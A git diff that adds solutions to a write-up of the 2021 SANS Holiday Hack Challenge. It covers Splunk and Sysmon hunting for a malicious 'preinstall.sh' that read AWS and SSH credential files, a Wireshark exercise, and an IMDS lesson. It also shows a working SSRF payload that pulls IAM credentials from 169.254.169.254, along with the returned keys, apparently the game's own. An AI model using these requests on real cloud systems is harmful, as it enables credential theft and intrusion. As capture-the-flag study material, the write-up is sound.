@@ -416,8 +416,8 @@ There are 8 tasks to solve in order to complete the objective:
 
 Using this query, the answer is `git status`:
 ```
-index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine="git*" EventCode=1
-| stats count by CommandLine | sort count desc
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational
+CommandLine="git*" EventCode=1 | stats count by CommandLine | sort count desc
 ```
 
 ##### Task 2
@@ -432,8 +432,8 @@ This can be completed by just looking through the results from the previous comm
 Modify the query from task 1 to look for Docker commands:
 
 ```
-index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational CommandLine="docker*" EventCode=1
-| stats count by CommandLine | sort count desc
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational
+CommandLine="docker*" EventCode=1 | stats count by CommandLine | sort count desc
 ```
 
 The answer is `docker compose up`.
@@ -454,7 +454,7 @@ Then, scroll down to the `repository.url` field in the left sidebar. This shows 
 Notice the `dvws-node` portion of two of the URLs &ndash; this could have been forked from the outside, so use a search engine to find it on GitHub. Indeed, it's [this](https://github.com/snoopysecurity/dvws-node) repository.
 
 ##### Task 5
-Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation.
+>Santa asked Eddie to add a JavaScript library from NPM to the 'partnerapi' project. Determine the name of the library and record it here for our workshop documentation.
 
 These dependencies are stored in `package.json`. The following query looks for any `git commit` commands in which the log mentions both "partnerapi" and "package.json":
 
@@ -470,7 +470,7 @@ git commit package.json -m Added holiday-utils-js dependency
 ```
 
 ##### Task 6
-Another elf started gathering a baseline of the network activity that Eddie generated. Start with [their search](https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search?q=search%20index%3Dmain%20sourcetype%3Djournald%20source%3DJournald%3AMicrosoft-Windows-Sysmon%2FOperational%20EventCode%3D3%20user%3Deddie%20NOT%20dest_ip%20IN%20(127.0.0.*)%20NOT%20dest_port%20IN%20(22%2C53%2C80%2C443)%20%0A%7C%20stats%20count%20by%20dest_ip%20dest_port&display.page.search.mode=smart&dispatch.sample_ratio=1&workload_pool=&earliest=0&latest=now) and capture the full `process_name` field of anything that looks suspicious.
+>Another elf started gathering a baseline of the network activity that Eddie generated. Start with [their search](https://hhc21.bossworkshops.io/en-US/app/SA-hhc/search?q=search%20index%3Dmain%20sourcetype%3Djournald%20source%3DJournald%3AMicrosoft-Windows-Sysmon%2FOperational%20EventCode%3D3%20user%3Deddie%20NOT%20dest_ip%20IN%20(127.0.0.*)%20NOT%20dest_port%20IN%20(22%2C53%2C80%2C443)%20%0A%7C%20stats%20count%20by%20dest_ip%20dest_port&display.page.search.mode=smart&dispatch.sample_ratio=1&workload_pool=&earliest=0&latest=now) and capture the full `process_name` field of anything that looks suspicious.
 
 Simply add `process_name` to the end of the query so that it includes it in the result. There are only two entries and the suspicious one stands out:
 
@@ -479,12 +479,12 @@ Simply add `process_name` to the end of the query so that it includes it in the 
 ```
 
 ##### Task 7
-Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here.
+>Uh oh. This documentation exercise just turned into an investigation. Starting with the process identified in the previous task, look for additional suspicious commands launched by the same parent process. One thing to know about these Sysmon events is that Network connection events don't indicate the parent process ID, but Process creation events do! Determine the number of files that were accessed by a related process and record it here.
 
 Start by getting the parent process ID of the `/usr/bin/nc.openbsd` process launch:
 ```
-index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1
-user=eddie process_name=/usr/bin/nc.openbsd
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational
+EventCode=1 user=eddie process_name=/usr/bin/nc.openbsd
 | table parent_process_id, parent_process, process_name
 ```
 
@@ -501,13 +501,13 @@ cat /home/eddie/.aws/credentials /home/eddie/.ssh/authorized_keys /home/eddie/.s
 ```
 
 ##### Task 8
-Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.
+>Use Splunk and Sysmon Process creation data to identify the name of the Bash script that accessed sensitive files and (likely) transmitted them to a remote IP address.
 
 This is simply taking the previous query task one step further. In order for a script to have initiated the actions investigated in task 7, it had to have created a new process; therefore, we want the parent process of the Bash process whose child processes we were just investigating (6788):
 
 ```
-index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1
-user=eddie process_id=6788 | table parent_process_id, parent_process, process_name
+index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational
+EventCode=1 user=eddie process_id=6788 | table parent_process_id, parent_process, process_name
 ```
 
 The parent is a `preinstall.sh`.
@@ -525,6 +525,44 @@ What is the secret access key for the [Jack Frost Tower job applications server]
 
 #### Solution
 
+Noxious O. D'or hinted about an SSRF (server-side request forgery) vulnerability on the website, so we need to find some spot where we provide information to the server, like a form. The [Apply](https://apply.jackfrosttower.com/?p=apply) page has just that. In fact, it has a URL field, which comes prefilled with another website that's worth checking out: [North Pole Police Department](https://nppd.northpolechristmastown.com/). Take a look at the [Infractions](https://nppd.northpolechristmastown.com/infractions) page, which contains information that the job application is requesting.
+
+If you try to make up information, you just get "Submission Accepted", but if you use information from the NPPD website, you get additional content like "Naughty list recipients rejoice!" and "We'll be in touch." along with a broken link to a picture of the person/troll/thing? whose name you used.
+
+Example using Suzanne Hart: https://apply.jackfrosttower.com/?inputName=Suzanne+Hart&inputEmail=sh%40troll.com&inputPhone=1&inputField=Throwing+rocks+%28at+people%29&resumeFile=&inputWorkSample=http%3A%2F%2F169.254.169.254&additionalInformation=&submit=
+
+![Jack Frost Tower application submission for Suzanne Hart](./jf_apply_submission.png)
+
+What's wrong with that image though? Could it be coming from the NPPD website (or at least it's intended to come from there)? Taking a look at this page on it's own in the browser reveals an interestingly different error message:
+
+![image has errors](./image_has_errors.png)
+
+Did the server make that request on our behalf though? Try using cURL on that same endpoint:
+
+```shell
+$ curl https://apply.jackfrosttower.com/images/Suzanne%20Hart.jpg
+latest
+```
+
+Bingo! The request was made on our behalf and the result is there. Now, we can modify the form submission URL to pull out the information that we need. The key is what was hinted at in the IMDS challenge - the IAM security credentials. Modify the application to hit the `/latest/meta-data` endpoint and look for `iam/security-credentials` when using the above cURL command. You'll see one for `jf-deploy-role` so update the application to `/latest/meta-data/iam/security-credentials/jf-deploy-role`:
+
+https://apply.jackfrosttower.com/?inputName=Suzanne+Hart&inputEmail=sh%40troll.com&inputPhone=1&inputField=Throwing+rocks+%28at+people%29&resumeFile=&inputWorkSample=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fjf-deploy-role&additionalInformation=&submit=
+
+
+Like before, use cURL to read the response and get the secret access key:
+
+```shell
+curl https://apply.jackfrosttower.com/images/Suzanne%20Hart.jpg
+{
+	"Code": "Success",
+	"LastUpdated": "2021-05-02T18:50:40Z",
+	"Type": "AWS-HMAC",
+	"AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+	"SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+	"Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+	"Expiration": "2026-05-02T18:50:40Z"
+}
+```
 
 ### 11. Customer Complaint Analysis
 #### Difficulty
@@ -535,6 +573,17 @@ A human has accessed the Jack Frost Tower network with a non-compliant host. [Wh
 
 #### Solution
 
+After talking to Tinsel Upatree, we learn about the "evil bit". Given the context, compliance here means setting the "evil bit" to 1, so first look for any HTTP activity with that not set with the following filters in Wireshark (the PCAP is in the zip linked in the description):
+
+```
+ip.flags.rb == 0 and http
+```
+
+This brings up a complaint from a Muffy VonDuchess Sebastian in room 1024 (information is from the POST request Muffy made to the complaint endpoint). Create another search to see which trolls complained about the guest in that room. The complaints were made by Flud, Hagg, and Yaqh:
+
+```
+ip.flags.rb == 1 and http.request.method == POST and http.file_data contains "1024"
+```
 
 ### 12. Frost Tower Website Checkup
 #### Difficulty
@@ -666,11 +715,240 @@ Make sure to talk to Chimney Scissorsticks again to get tips for the Shellcode P
 ### Eve Snowshoes - HoHo ... No
 (Santa's Office) --> needs to be solved to help objective 8 "Kereboasting" which is rated 5/5 --> save for later
 
-# TODO: Remaining Challenges on JF's side
 ### Noxious O. D'Or - IMDS Exploration
-(Jack's bathroom)
+>The Instance Metadata Service (IMDS) is a virtual server for cloud assets at the IP address 169.254.169.254. Send a couple ping packets to the server.
 
+```shell
+elfu@e958e83b81b3:~$ ping -c 2 169.254.169.254
+PING 169.254.169.254 (169.254.169.254) 56(84) bytes of data.
+64 bytes from 169.254.169.254: icmp_seq=1 ttl=64 time=0.015 ms
+64 bytes from 169.254.169.254: icmp_seq=2 ttl=64 time=0.030 ms
+
+--- 169.254.169.254 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 0.015/0.022/0.030/0.007 ms
+```
+>IMDS provides information about currently running virtual machine instances. You can use it to manage and configure cloud nodes. IMDS is used by all major cloud providers. Developers can automate actions using IMDS. We'll interact with the server using the cURL tool. Run `curl http://169.254.169.254` to access IMDS data.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254
+latest
+```
+
+>Different providers will have different formats for IMDS data. We're using an AWS-compatible IMDS server that returns 'latest' as the default response. Access the 'latest' endpoint. Run `curl http://169.254.169.254/latest`
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest
+dynamic
+meta-data
+```
+
+>IMDS returns two new endpoints: dynamic and meta-data. Let's start with the dynamic endpoint, which provides information about the instance itself. Repeat the request to access the dynamic endpoint: `curl http://169.254.169.254/latest/dynamic`.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/dynamic
+fws/instance-monitoring
+instance-identity/document
+instance-identity/pkcs7
+instance-identity/signature
+```
+
+>The instance identity document can be used by developers to understand the instance details. Repeat the request, this time requesting the instance-identity/document resource: `curl http://169.254.169.254/latest/dynamic/instance-identity/document`.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document
+{
+        "accountId": "PCRVQVHN4S0L4V2TE",
+        "imageId": "ami-0b69ea66ff7391e80",
+        "availabilityZone": "np-north-1f",
+        "ramdiskId": null,
+        "kernelId": null,
+        "devpayProductCodes": null,
+        "marketplaceProductCodes": null,
+        "version": "2017-09-30",
+        "privateIp": "10.0.7.10",
+        "billingProducts": null,
+        "instanceId": "i-1234567890abcdef0",
+        "pendingTime": "2021-12-01T07:02:24Z",
+        "architecture": "x86_64",
+        "instanceType": "m4.xlarge",
+        "region": "np-north-1"
+}
+```
+
+>Much of the data retrieved from IMDS will be returned in JavaScript Object Notation (JSON) format. Piping the output to `jq` will make the content easier to read. Re-run the previous command, sending the output to JQ: `curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq`
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   451  100   451    0     0   440k      0 --:--:-- --:--:-- --:--:--  440k
+{
+  "accountId": "PCRVQVHN4S0L4V2TE",
+  "imageId": "ami-0b69ea66ff7391e80",
+  "availabilityZone": "np-north-1f",
+  "ramdiskId": null,
+  "kernelId": null,
+  "devpayProductCodes": null,
+  "marketplaceProductCodes": null,
+  "version": "2017-09-30",
+  "privateIp": "10.0.7.10",
+  "billingProducts": null,
+  "instanceId": "i-1234567890abcdef0",
+  "pendingTime": "2021-12-01T07:02:24Z",
+  "architecture": "x86_64",
+  "instanceType": "m4.xlarge",
+  "region": "np-north-1"
+}
+```
+
+>Here we see several details about the instance when it was launched. Developers can use this information to optimize applications based on the instance launch parameters. In addition to dynamic parameters set at launch, IMDS offers metadata about the instance as well. Examine the metadata elements available: `curl http://169.254.169.254/latest/meta-data`
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/meta-data
+ami-id
+ami-launch-index
+ami-manifest-path
+block-device-mapping/ami
+block-device-mapping/ebs0
+block-device-mapping/ephemeral0
+block-device-mapping/root
+block-device-mapping/swap
+elastic-inference/associations
+elastic-inference/associations/eia-bfa21c7904f64a82a21b9f4540169ce1
+events/maintenance/scheduled
+events/recommendations/rebalance
+hostname
+iam/info
+iam/security-credentials
+iam/security-credentials/elfu-deploy-role
+instance-action
+instance-id
+instance-life-cycle
+instance-type
+latest
+latest/api/token
+local-hostname
+local-ipv4
+macnetwork/interfaces/macs/0e:49:61:0f:c3:11/device-number
+network/interfaces/macs/0e:49:61:0f:c3:11/interface-id
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv4-associations/192.0.2.54
+network/interfaces/macs/0e:49:61:0f:c3:11/ipv6s
+network/interfaces/macs/0e:49:61:0f:c3:11/local-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/local-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/mac
+network/interfaces/macs/0e:49:61:0f:c3:11/owner-id
+network/interfaces/macs/0e:49:61:0f:c3:11/public-hostname
+network/interfaces/macs/0e:49:61:0f:c3:11/public-ipv4s
+network/interfaces/macs/0e:49:61:0f:c3:11/security-group-ids
+network/interfaces/macs/0e:49:61:0f:c3:11/security-groups
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-id
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/subnet-ipv6-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-id
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-block
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv4-cidr-blocks
+network/interfaces/macs/0e:49:61:0f:c3:11/vpc-ipv6-cidr-blocks
+placement/availability-zone
+placement/availability-zone-id
+placement/group-name
+placement/host-id
+placement/partition-number
+placement/region
+product-codes
+public-hostname
+public-ipv4
+public-keys/0/openssh-key
+reservation-id
+security-groups
+services/domain
+services/partition
+spot/instance-action
+spot/termination-time
+```
+
+>By accessing the metadata elements, a developer can interrogate information about the system. Take a look at the public-hostname element: `curl http://169.254.169.254/latest/meta-data/public-hostname`
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/meta-data/public-hostname
+ec2-192-0-2-54.compute-1.amazonaws.comelfu@e958e83b81b3:~$ 
+```
+
+>Many of the data elements returned won't include a trailing newline, which causes the response to blend into the prompt. Re-run the prior command, adding '; echo' to the end of the command. This will add a new line character to the response.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/meta-data/public-hostname; echo;
+ec2-192-0-2-54.compute-1.amazonaws.com
+```
+
+>There is a whole lot of information that can be retrieved from the IMDS server. Even AWS Identity and Access Management (IAM) credentials! Request the endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials` to see the instance IAM role.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials; echo;
+elfu-deploy-role
+```
+
+>Once you know the role name, you can request the AWS keys associated with the role. Request the endpoint `http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role` to get the instance AWS keys.
+
+```shell
+elfu@e958e83b81b3:~$ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/elfu-deploy-role | jq
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   308  100   308    0     0   300k      0 --:--:-- --:--:-- --:--:--  300k
+{
+  "Code": "Success",
+  "LastUpdated": "2021-12-02T18:50:40Z",
+  "Type": "AWS-HMAC",
+  "AccessKeyId": "AKIA5HMBSK1SYXYTOXX6",
+  "SecretAccessKey": "CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX",
+  "Token": "NR9Sz/7fzxwIgv7URgHRAckJK0JKbXoNBcy032XeVPqP8/tWiR/KVSdK8FTPfZWbxQ==",
+  "Expiration": "2026-12-02T18:50:40Z"
+}
+```
+
+>So far, we've been interacting with the IMDS server using IMDSv1, which does not require authentication. Optionally, AWS users can turn on IMDSv2 that requires authentication. This is more secure, but not on by default. For IMDSv2 access, you must request a token from the IMDS server using the `X-aws-ec2-metadata-token-ttl-seconds` header to indicate how long you want the token to be used for (between 1 and 21,600 secods). Examine the contents of the `gettoken.sh` script in the current directory using `cat`.
+
+```shell
+elfu@e958e83b81b3:~$ cat gettoken.sh 
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+```
+
+>This script will retrieve a token from the IMDS server and save it in the environment variable `TOKEN`. Import it into your environment by running `source gettoken.sh`.
+
+```shell
+elfu@e958e83b81b3:~$ source gettoken.sh 
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    44  100    44    0     0  44000      0 --:--:-- --:--:-- --:--:-- 44000
+```
+
+>Now, the IMDS token value is stored in the environment variable `TOKEN`. Examine the contents of the token by running `echo $TOKEN`.
+
+```shell
+elfu@e958e83b81b3:~$ echo $TOKEN
+Uv38ByGCZU8WP18PmmIdcpVmx00QA3xNe7sEB9Hixkk=
+```
+
+>With the IMDS token, you can make an IMDSv2 request by adding the `X-aws-ec2-metadata-token` header to the curl request. Access the metadata region information in an IMDSv2 request: `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region`
+
+```shell
+elfu@e958e83b81b3:~$ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/placement/region
+```
+
+>🍬🍬🍬🍬Congratulations!🍬🍬🍬🍬
+You've completed the lesson on Instance Metadata interaction. Run 'exit' to close.
+
+
+# TODO: Remaining Challenges on JF's side
 ### Ingreta Tude - Frost Tower Website Checkup
 (Jack's studio) --> this might be objective 12
 
 ### Objective 13 is on the roof of the Frost Tower
+
+### Bonus Challenges - Log4J
+These were added on 12/21/21 at the North Pole location.
+
+#### Bow Ninecandle - Bonus! Blue Log4Jack
+
+
+#### Icky McGoop - Bonus! Red Log4Jack
